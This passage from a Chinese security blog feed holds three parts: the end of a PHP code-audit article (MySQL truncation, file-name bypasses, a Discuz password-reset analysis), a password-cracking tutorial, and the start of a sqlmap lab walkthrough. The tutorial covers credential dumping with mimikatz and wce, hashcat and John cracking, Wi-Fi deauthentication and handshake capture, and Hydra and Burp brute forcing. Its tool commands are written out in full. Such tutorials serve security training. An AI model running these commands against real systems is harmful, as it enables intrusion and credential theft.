title="数据截断"></a>数据截断</h4><p>对于很多web应用文件在很多功能是不容许重复数据的，比如用户注册功能等。一般的应用程序对于提交注册的username和数据库里已有的username对比是不是已经有重复数据，然而我们可以通过“数据截断”等来饶过这些判断，数据库在处理时候产生截断导致插入重复数据。</p><p><em>1) Mysql SQL Column Truncation Vulnerabilities</em></p><p>这个漏洞又是大牛Stefan Esser发现的（Stefan Esser是我的偶像:)），这个是由于mysql的sql_mode设置为default的时候，即没有开启STRICT_ALL_TABLES选项时，MySQL对于插入超长的值只会提示warning，而不是error（如果是error就插入不成功），这样可能会导致一些截断问题。测试如下：<br>​    </p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin","pass");</div><div class="line"></div><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values("admin           x", "new_pass");</div><div class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass     |</div><div class="line">| 2 | admin      | new_pass |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure><p><em>2) Mysql charset Truncation vulnerability</em></p><p>这个漏洞是80sec发现的，当mysql进行数据存储处理utf8等数据时对某些字符导致数据截断。测试如下：<br>​    </p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; insert into truncated_test(`username`,`password`) values(concat("admin",0xc1), "new_pass2");</div><div class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from truncated_test;</div><div class="line">+----+------------+----------+</div><div class="line">| id | username   | password |</div><div class="line">+----+------------+----------+</div><div class="line">| 1 | admin      | pass      |</div><div class="line">| 2 | admin      | new_pass  |</div><div class="line">| 3 | admin      | new_pass2 |</div><div class="line">+----+------------+----------+</div><div class="line">2 rows in set (0.00 sec)</div></pre></td></tr></table></figure><p>很多的web应用程序没有考虑到这些问题，只是在数据存储前简单查询数据是否包含相同数据，如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$result = mysql_query(<span class="string">"SELECT * from test_user where user='$user' "</span>);</div><div class="line">  ....</div><div class="line"><span class="keyword">if</span>(@mysql_fetch_array($result, MYSQL_NUM)) &#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"already exist"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：通读代码</td></tr></tbody></table><h4 id="文件操作里的特殊字符"><a href="#文件操作里的特殊字符" class="headerlink" title="文件操作里的特殊字符"></a>文件操作里的特殊字符</h4><p>文件操作里有很多特殊的字符，发挥特别的作用，很多web应用程序没有注意处理这些字符而导致安全问题。比如很多人都知道的windows系统文件名对“空格”和“.”等的忽视，这个主要体现在上传文件或者写文件上，导致直接写webshell。另外对于windows系统对“...\”进行系统转跳等等。<br>​<br>下面还给大家介绍一个非常有意思的问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Is this code vul?</span></div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line">.....</div><div class="line">header(<span class="string">'Content-Disposition: attachment; filename='</span>.$filename);</div></pre></td></tr></table></figure><p>很多人看出来了上面的代码的问题，程序首先禁止使用“.php”后缀。但是下面居然接了个str_replace替换$webdb[www_url]为空，那么我们提交“.p$webdb[www_url]hp”就可以饶过了。那么上面的代码杂fix呢？有人给出了如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$fileurl=str_replace($webdb[www_url],<span class="string">""</span>,$url);</div><div class="line"><span class="keyword">if</span>( eregi(<span class="string">".php"</span>,$url) )&#123;</div><div class="line"><span class="keyword">die</span>(<span class="string">"ERR"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">255</span>;$i++) &#123;</div><div class="line">$url = <span class="string">'1.ph'</span>.chr($i);</div><div class="line">$tmp = @file_get_contents($url);</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($tmp)) <span class="keyword">echo</span> chr($i).<span class="string">"\r\n"</span>;</div><div class="line">&#125;  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>我们在windows系统运行上面的代码得到如下字符<code>*</code> &lt; &gt; ? P p都可以打开目录下的1.php。</p><table><thead><tr><th style="text-align:left"><em>漏洞审计策略</em></th></tr></thead><tbody><tr><td style="text-align:left">PHP版本要求：无</td></tr><tr><td style="text-align:left">系统要求：无</td></tr><tr><td style="text-align:left">审计策略：文读取件操作函数</td></tr></tbody></table><h3 id="怎么进一步寻找新的字典"><a href="#怎么进一步寻找新的字典" class="headerlink" title="怎么进一步寻找新的字典"></a>怎么进一步寻找新的字典</h3><p>上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？</p><ul><li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典</li><li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式</li><li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来</li><li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）</li><li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题</li><li>你有什么要补充的吗？ ：）</li></ul><h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><table><thead><tr><th style="text-align:left"><em>DEMO</em></th></tr></thead><tbody><tr><td style="text-align:left">*DEMO – Discuz! Reset User Password 0day Vulnerability 分析</td></tr><tr><td style="text-align:left">（Exp:[<a href="http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*" target="_blank" rel="external">http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt]）*</a></td></tr><tr><td style="text-align:left">PHP版本要求:php4 php5&lt;5.2.6</td></tr><tr><td style="text-align:left">系统要求: 无</td></tr><tr><td style="text-align:left">审计策略:查找mt_srand/mt_rand</td></tr></tbody></table><p>第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">heige@heige-desktop:~/dz6/upload$ grep -in &apos;mt_srand&apos; -r ./ --colour -5</div><div class="line">./include/global.func.php-694-  $GLOBALS[&apos;rewritecompatible&apos;] &amp;&amp; $name = rawurlencode($name);</div><div class="line">./include/global.func.php-695-  return &apos;&lt;a href=&quot;tag-&apos;.$name.&apos;.html&quot;&apos;.stripslashes($extra).&apos;&gt;&apos;;</div><div class="line">./include/global.func.php-696-&#125;</div><div class="line">./include/global.func.php-697-</div><div class="line">./include/global.func.php-698-function random($length, $numeric = 0) &#123;</div><div class="line">./include/global.func.php:699:  PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div><div class="line">./include/global.func.php-700-  if($numeric) &#123;</div><div class="line">./include/global.func.php-701-          $hash = sprintf(&apos;%0&apos;.$length.&apos;d&apos;, mt_rand(0, pow(10, $length) - 1));</div><div class="line">./include/global.func.php-702-  &#125; else &#123;</div><div class="line">./include/global.func.php-703-          $hash = &apos;&apos;;</div><div class="line">./include/global.func.php-704-          $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&apos;;</div><div class="line">--</div><div class="line">./include/discuzcode.func.php-30-</div><div class="line">./include/discuzcode.func.php-31-if(!isset($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;bbcodes&apos;]) | !is_array($_DCACHE[&apos;smilies&apos;])) &#123;</div><div class="line">./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.&apos;./forumdata/cache/cache_bbcodes.php&apos;;</div><div class="line">./include/discuzcode.func.php-33-&#125;</div><div class="line">./include/discuzcode.func.php-34-</div><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div><div class="line">./include/discuzcode.func.php-36-</div><div class="line">./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) &#123;</div><div class="line">./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;</div><div class="line">./include/discuzcode.func.php-39-       $attach = $postlist[$pid][&apos;attachments&apos;][$aid];</div><div class="line">./include/discuzcode.func.php-40-       if($attach[&apos;attachimg&apos;]) &#123;</div></pre></td></tr></table></figure><p>有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_VERSION &lt; &apos;4.2.0&apos; &amp;&amp; mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure><p>判断了版本，如果是PHP_VERSION &gt; ‘4.2.0’使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：</p><p>1) ‘Cross Application Attacks’ 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);</div></pre></td></tr></table></figure><p>这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）</p><p>2) 有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用’Cross Application Attacks’，5.2.6&gt;php&gt;4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。</p><h3 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h3><p>本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。</p><p>另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。</p><p>本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！</p><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><p>[1] (<a href="http://bbs.phpchina.com/attachment.php?aid=22294" target="_blank" rel="external">http://bbs.phpchina.com/attachment.php?aid=22294</a>)<br>[2] ([<a href="http://www.php-security.org/" target="_blank" rel="external">http://www.php-security.org/</a>)<br>[3] (<a href="http://bugs.php.net/bug.php?id=40114" target="_blank" rel="external">http://bugs.php.net/bug.php?id=40114</a>)</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>密码破解系列</title>
      <link href="/2017/10/28/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97/"/>
      <url>/2017/10/28/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E7%B3%BB%E5%88%97/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了有关Windows密码、Linux密码、网络设备密码、数据库密码、无线网络密码、web应用登陆密码的破解以及在线扫描服务的密码破解。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>####1.windows密码破解</p><p>获取密码（抓取HASH）：pwdump、wce、mimikatz</p><p>破解密码：hashcat、LC5、SAMInside.exe、Ophcrack、mimikatz、hashsuite</p><p>密码抓取：</p><p>环境：windows7</p><p>前提：已经获取root权限</p><p>工具：mimikatz</p><p>操作：</p><p>原理是从lsass.exe进程中直接获取密码信息进行破解，而且该破解应该并非穷举方式，而是直接根据算法进行反向计算。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/9BDC799D-7107-4E3A-86CB-E65207AB9637.png" alt="9BDC799D-7107-4E3A-86CB-E65207AB9637"></p><p>密码提取：</p><p>原因：为了进行口令破解，必须首先运行一个工具，将Windows口令从SAM文件中提取出来，做这一步工作的原因在于Windows运行过程中SAM被锁定，不能直接复制或编辑这个文件(即使有管理员权限也不行)。</p><p>环境：windows10（提取hash）、Windows7（破解hash）</p><p>工具：Pwdump7，wce（Windows Credentials Editor）</p><p>操作：</p><p>用管理员权限打开Pwdump7，从而获得Windows口令</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.09.05.png" alt="img"></p><p>用管理员权限打开wce，从而获得Windows的NTML HASH</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-28%20%E4%B8%8B%E5%8D%888.10.25.png" alt="img"></p><p>还可以利用wce直接获取Windows的密码（-w参数是通过摘要式认证缓存一个明文的密码）：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/BDD60E9E-A4AA-4443-B846-B2217A7A0206.png" alt="img"></p><p>密码破解：</p><p>环境：Windows10（CPU：i5；GPU：gtx860）</p><p>工具：hashcat、hashsuite</p><p>操作：</p><p>1.使用hashcat进行密码的破解</p><p>hashcat参数简介：</p><p>-m 这个是指定破解的hash的类型，具体的类型可以在–help参数中看到。 默认是0也就是MD5，而NTLM则是1000。 </p><p>-a 指定破解的模式，默认是字典模式 </p><p>-o 输出文件，破解成功的密码存放的文件 </p><p>–remove移除破解成功的hash，当hash是从文本中读取时有用，避免自 己手工移除已经破解的hash</p><p>–username 忽略用户名，如果你的hash文件中是username:hash这种格式只 需要指定这个参数，就不需要再手工编辑了 </p><p>-r 指定规则文件，字典根据规则文件做变形，用于破解相似密码当-a指定为3 时，就是暴力破解模式，这个模式下需要自己指定mask和长度。</p><p>Hashcat-plus中以?l表示小写字母，?d表示数字，?u表示大写字母，?s表示所有可打印符号，?a代表所有可打印字符，它等于?l?u?d?s加在一起。 </p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028814.png" alt="img"></p><p>2.使用SAMInside.exe进行密码破解</p><p>环境：Windows10</p><p>1）使用管理员身份运行SAMInside.exe</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028815.png" alt="img"></p><p>2）你可以选择使用Pwdump7获取口令之后将其导入SAMInside.exe进行破解；或者使用SAMInside.exe来直接获取本地口令进行破解（本例使用第二种方式，点击三个小人的图标然后选择import local users via scheduler将本地用户的hash导出来）。</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/62EA4762-1EEB-4C95-B04D-A092175F1118.png" alt="img"></p><p>3）选择用户加载字典来进行爆破，最终可以看到已经破解了口令</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/B20BF1A6-DA9E-43C2-AA15-DC90419A748F.png" alt="img"></p><p>注：由于我之前载入字典破解了本地密码所以在每次导入时均会显示已经破解了密码</p><p>3.使用hashsuite可以直接进行windows的NTML HASH的抓取与破解。但是前提依旧是在管理员权限下进行</p><p>环境：windows10</p><p>1）首先以管理员身份运行hashsuite</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028818.png" alt="img"></p><p>2）导入要破解的口令，在这里我们选择导入本地的口令（选择后软件会自动将口令进行提取）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028819.png" alt="img"></p><p>3）之后我们选择使用字典破解的方式对账户Assassin001的口令进行破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028820.png" alt="img"></p><p>####2.Linux密码破解</p><p>知识概要：</p><p>▶ head -n 2 /etc/passwd</p><p>root;x:0:0:root:/root:/usr/bin/zsh</p><p>daemon:x;1:1:daemon:/usr/sbin:/usr/sbin/nologin</p><p>以”:”分隔，共有七个字段：</p><p>1.账号名称；2.密码（Linux早期密码存放地，现在均存在/etc/shadow中）；3.UID（用户标识符）；4.GID；5.用户信息说明列；6.主文件夹；7.shell</p><p>▶ head -n 2 /etc/shadow</p><p>root:$6$XrLBeXo2$iYJYakUC6eBvRl40PnFKlemX7IjI7QkFu7f3qTZjIr.RBy3dp3YT3QWkDYxmKBmmzQO8FUXXbK72lnaz.GeSB0:17304:0:99999:7:::</p><p>daemon:*:17043:0:99999:7:::</p><p>以”:”分隔，共有九个字段：</p><p>1.账号名称；2.密码；3.最近更新密码的日期；4.密码不可被更动的天数；5.密码需要重新更改的天数；6.密码需要更改期限前的警告天数；7.密码过期后的账号宽限时间；8.账号失效日期；9.保留</p><p>密码抓取：</p><p>环境：kali linux</p><p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p><p>工具：mimipenguin(Linux下的mimikatz)</p><p>操作：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.28.10.png" alt="img"></p><p>密码破解：</p><p>环境：kali linux</p><p>前提：已经获取root权限(可以使用dirtycow.c等0day进行Linux的提权操作)</p><p>工具：John the ripper</p><p>操作：</p><p>1.使用unshadow命令创建1个含有用户名和密码详细信息的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.25.01.png" alt="img"></p><p>2.使用John来破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-09-30%20%E4%B8%8A%E5%8D%8811.29.10.png" alt="img"></p><p>####3.网络设备密码破解</p><p>环境：windows7</p><p>工具：Cain</p><p>操作：</p><p>破解Cisco中Password 7加密，密文为052C3C5F70420F1A0E</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028822.png" alt="img"></p><p>环境：kali linux</p><p>工具：John the ripper</p><p>操作：</p><p>1.将密文整理成cisco: $1$sqzM$q8vBgOd3KunqZw/D1Nq211，保存在文件中然后使用john进行破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028823.png" alt="img"></p><p>####4.数据库密码破解</p><p>环境：windows10 MSSQL数据库</p><p>工具：Cain</p><p>操作：</p><p>1.添加Hash到队列</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028825.png" alt="img"></p><p>2.开始暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028826.png" alt="img"></p><p>环境：windows10  MYSQL数据库</p><p>工具：Cain</p><p>操作：</p><p>1.执行SELECT password,USER() FROM mysql.user;来获取密文</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028827.png" alt="img"></p><p>2.将MYSQL的密文导入Cain</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028828.png" alt="img"></p><p>3.使用字典攻击模式进行攻击</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028829.png" alt="img"></p><p>环境：windows10 Oracle数据库</p><p>工具：Cain</p><p>操作：</p><p>1.导入Oracle数据库账号密码</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028830.png" alt="img"></p><p>2.进行暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028831.png" alt="img"></p><p>####5.无线密码破解</p><p>环境：kali linux 、WPA/WPA2 PSK加密  无线路由器  TP-LINK_4D16、Windows10（hashcat进行GPU运算）</p><p>工具：外置USB无线网卡  </p><p>操作：</p><ol><li>把网卡切换为监听模式</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo airmon-ng start wlan0</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028835.png" alt="img"></p><p>2.监听网络流量信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo airodump-ng -w file wlan0mon</div></pre></td></tr></table></figure><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028836.png" alt="img"></p><ol><li>使用mdk3， 强制断线路由的所有链接， 此次操作是为了能让aircrack抓到wifi的握手信息 ， -c为需要强制断线的信道：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mdk3 wlan0mon d -c 11</div></pre></td></tr></table></figure><p>过了几分钟， 可以看到， 用户重新连接上了901路由， 我们也捕获到了handshake信息， 上面airodump-ng的命令窗口顶部出现了以下信息 WPA handshake  ，此时直接ctrl＋c ，停止捕获信息</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028837.png" alt="img"></p><p>在kali的Home目录下生成了了几个文件 ，此时的file-01.cap为最重要的文件：</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028838.png" alt="img"></p><p>4.把文件转换为hccapx格式， 我们打开这个网站：<a href="https://hashcat.net/cap2hccapx/" target="_blank" rel="external">https://hashcat.net/cap2hccapx/</a> ， 然后选择cap文件并点击covert按钮， 并下载一个hccapx格式的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028839.png" alt="img"></p><p>5.网页会返回一个hccapx的文件， 使用hashcat命令破解， 参数dict.txt为生成的字典文件 ， -m参数2500代表破解的方式为WPA/WPA2， 999.hccapx为生成的文件， 最后破解出来的密码为whitehat：</p><p>PS E:\MYSEC\hashcat-3.6.0&gt; .\hashcat64.exe -m 2500 999.hccapx dict.txt</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028840.png" alt="img"></p><p>####6.web应用破解</p><p>环境：Windows10（phpstudy搭建漏洞靶场DVWA的爆破模块）</p><p>工具：burpsuite</p><p>操作：</p><p>1.使用burpsuite抓取登录时候的数据包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.39.49.png" alt="img"></p><p>2.将数据包发送至Intruder模块并对攻击点进行标注</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.02.png" alt="img"></p><p>3.载入攻击字典并进行暴力破解</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.40.13.png" alt="img"></p><p>4.暴力破解后效果</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.41.42.png" alt="img"></p><p>5.验证破解密码是否正确（一般观察Length和Status来判断正确的密码）</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.07.png" alt="img"></p><p>6.如果密码不正确的页面截图</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-09%20%E4%B8%8B%E5%8D%885.42.20.png" alt="img"></p><p>环境：Windows7</p><p>工具：AWVS 10.5版本</p><p>操作：</p><p>1.设置浏览器代理访问登录界面使用burpsuite抓取登录请求包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028850.png" alt="img"></p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028851.png" alt="img"></p><p>2.在AWVS扫描器中的HTTP Fuzzer模块填入刚抓的登录过程的HTTP数据包</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028852.png" alt="img"></p><p>3.在Generator中可以看到很多方式,可以使用AWVS自带的生成器,也可以选择File Generator来使用自己生成的字典.还可以设定是否编码.最后在需要穷举的地方指定变量,对应的是你Generator的name属性.图中的蓝色字体部分.</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028853.png" alt="img"></p><p>4.点击start，观察响应体可以看出爆破成功密码为password</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028854.png" alt="img"></p><p>####7.在线扫描破解hydra</p><p>环境：Windows10（FileZilla Server搭建的ftp服务器）、kali linux（预装了hydra）</p><p>测试用户：test：123456</p><p>操作：</p><p>1）启动ftp服务，启动成功后可以使用我添加的测试账户登录ftp读取我电脑E盘的文件</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028855.png" alt="img"></p><p>2）使用hydra来进行爆破</p><p>命令为：</p><p>hydra -L ./user.txt -P ./pass.txt -t 20 -vV -e ns 192.168.169.1 ftp</p><p>-l LOGIN 小写，用于指定破解的用户，对特定用户破解</p><p>-L FILE 大写，用于指定用户的用户名字典</p><p>-p PASS 小写，用于指定密码破解，少用，一般是采用密码字典</p><p>-P FILE 大写，用于指定密码字典</p><p>-vV为显示详细的爆破过程</p><p>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探</p><p>最后加上目标ip以及需要进行爆破的协议即可</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028856.png" alt="img"></p><p>3）显示成功后进行登录验证，发现可以成功登录</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/1028857.png" alt="img"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Webug渗透基础教程</title>
      <link href="/2017/10/24/Webug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
      <url>/2017/10/24/Webug%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>####普通的GET注入</p><p>解法一：使用sqlmap</p><p>1）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -b –current-db –current-user</p><p>可以看到当前的数据库名称以及用户名称</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p><p>2）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab –tables</p><p>可以看到pentesterlab中有那些数据表</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p><p>3）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag –columns</p><p>显示出该表下的所有列</p><p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p><p>4）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag -C flag 